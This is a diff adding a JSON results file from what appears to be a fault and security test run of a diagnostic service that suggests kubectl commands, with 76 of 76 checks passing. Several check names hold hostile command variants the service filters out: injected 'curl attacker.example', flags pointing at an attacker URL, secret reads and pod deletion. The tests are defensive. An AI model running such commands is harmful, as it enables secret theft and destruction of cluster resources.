@@ -1,0 +1,354 @@
+{
+  "created_at": "2026-10-22T13:28:02.605773+00:00",
+  "method": "Running service subprocesses over real HTTP. Controlled external-provider responses exercise faults; these scenarios do not measure model quality. No application functions mocked. Temporary driver outside repository.",
+  "scenarios": [
+    {
+      "check": "provider_invalid_json",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_nonobject",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_missing_vectors",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_short_vector",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_nan_vector",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_zero_vector",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_string_vector",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_wrong_index",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_html429",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_auth",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_quota",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "provider_disconnect",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "transient_failure_retries_then_recovers",
+      "passed": true,
+      "attempts": 3
+    },
+    {
+      "check": "query_embedding_cache",
+      "passed": true
+    },
+    {
+      "check": "generation_bad_output",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "generation_incomplete",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "generation_null_answer",
+      "passed": true,
+      "status": 503
+    },
+    {
+      "check": "stream_preserves_evidence_and_emits_error",
+      "passed": true
+    },
+    {
+      "check": "invalid_reranking_falls_back",
+      "passed": true
+    },
+    {
+      "check": "displayed_command_kubectl get pods -n NAMESPACE",
+      "passed": true,
+      "expected_retained": true
+    },
+    {
+      "check": "displayed_command_kubectl logs POD_NAME --previous",
+      "passed": true,
+      "expected_retained": true
+    },
+    {
+      "check": "displayed_command_kubectl describe pod POD_NAME",
+      "passed": true,
+      "expected_retained": true
+    },
+    {
+      "check": "displayed_command_kubectl auth can-i get pods",
+      "passed": true,
+      "expected_retained": true
+    },
+    {
+      "check": "displayed_command_kubectl get pods -shttps://attacker.example",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods -fhttps://attacker.example",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods,secrets",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get secrets.v1",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get secret/NAME",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods --raw=/api",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods; curl attacker.example",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl delete pods POD_NAME",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods --context=production",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "displayed_command_kubectl get pods -Ashttps://attacker.example",
+      "passed": true,
+      "expected_retained": false
+    },
+    {
+      "check": "citation_unknown",
+      "passed": true
+    },
+    {
+      "check": "citation_invented",
+      "passed": true
+    },
+    {
+      "check": "review_missing_fails_closed",
+      "passed": true
+    },
+    {
+      "check": "review_down_fails_closed",
+      "passed": true
+    },
+    {
+      "check": "review_rejection_abstains_and_drops_checks",
+      "passed": true
+    },
+    {
+      "check": "unsupported_check_removed_and_traced",
+      "passed": true
+    },
+    {
+      "check": "duplicate_rank_repaired_without_discarding_valid_order",
+      "passed": true
+    },
+    {
+      "check": "access_token_missing",
+      "passed": true,
+      "status": 401
+    },
+    {
+      "check": "access_token_incorrect",
+      "passed": true,
+      "status": 401
+    },
+    {
+      "check": "access_token_bare",
+      "passed": true,
+      "status": 401
+    },
+    {
+      "check": "access_token_valid",
+      "passed": true,
+      "status": 200
+    },
+    {
+      "check": "access_token_case_insensitive_scheme",
+      "passed": true,
+      "status": 200
+    },
+    {
+      "check": "health_discloses_access_requirement",
+      "passed": true
+    },
+    {
+      "check": "paid_budget_preserves_free_search",
+      "passed": true
+    },
+    {
+      "check": "request_validation_47",
+      "passed": true
+    },
+    {
+      "check": "request_validation_48",
+      "passed": true
+    },
+    {
+      "check": "request_validation_49",
+      "passed": true
+    },
+    {
+      "check": "request_validation_50",
+      "passed": true
+    },
+    {
+      "check": "request_validation_51",
+      "passed": true
+    },
+    {
+      "check": "request_validation_52",
+      "passed": true
+    },
+    {
+      "check": "declared_body_limit_and_security_headers",
+      "passed": true
+    },
+    {
+      "check": "chunked_body_limit",
+      "passed": true
+    },
+    {
+      "check": "static_path_traversal",
+      "passed": true
+    },
+    {
+      "check": "historical_report_marked",
+      "passed": true
+    },
+    {
+      "check": "peer_rate_limit",
+      "passed": true
+    },
+    {
+      "check": "forwarded_header_cannot_bypass_rate_limit",
+      "passed": true
+    },
+    {
+      "check": "slow_request_body_deadline",
+      "passed": true,
+      "elapsed_seconds": 10.0
+    },
+    {
+      "check": "invalid_index_null_pointer",
+      "passed": true
+    },
+    {
+      "check": "invalid_index_list_pointer",
+      "passed": true
+    },
+    {
+      "check": "invalid_index_traversal_pointer",
+      "passed": true
+    },
+    {
+      "check": "invalid_index_missing_pointer",
+      "passed": true
+    },
+    {
+      "check": "unreadable_report_is_readable_503",
+      "passed": true
+    },
+    {
+      "check": "missing_report_not_run",
+      "passed": true
+    },
+    {
+      "check": "ingestion_refuses_damaged_cache",
+      "passed": true
+    },
+    {
+      "check": "unconfigured_provider_reported",
+      "passed": true
+    },
+    {
+      "check": "bm25_without_provider",
+      "passed": true
+    },
+    {
+      "check": "generation_without_provider",
+      "passed": true
+    },
+    {
+      "check": "eight_concurrent_diagnoses_all_complete",
+      "passed": true,
+      "elapsed_seconds": 6.88
+    },
+    {
+      "check": "four_slot_upstream_concurrency_bound",
+      "passed": true,
+      "maximum_concurrent_provider_requests": 4
+    },
+    {
+      "check": "health_responsive_during_queued_generation",
+      "passed": true,
+      "health_ms": 3.07
+    },
+    {
+      "check": "disconnects_release_all_request_slots",
+      "passed": true,
+      "seconds": 3.02
+    },
+    {
+      "check": "evidence_review_deadline_is_enforced",
+      "passed": true,
+      "seconds": 10.01
+    },
+    {
+      "check": "cancellation_during_review_releases_slots",
+      "passed": true,
+      "seconds": 0.01
+    }
+  ],
+  "passed": 76,
+  "total": 76
+}
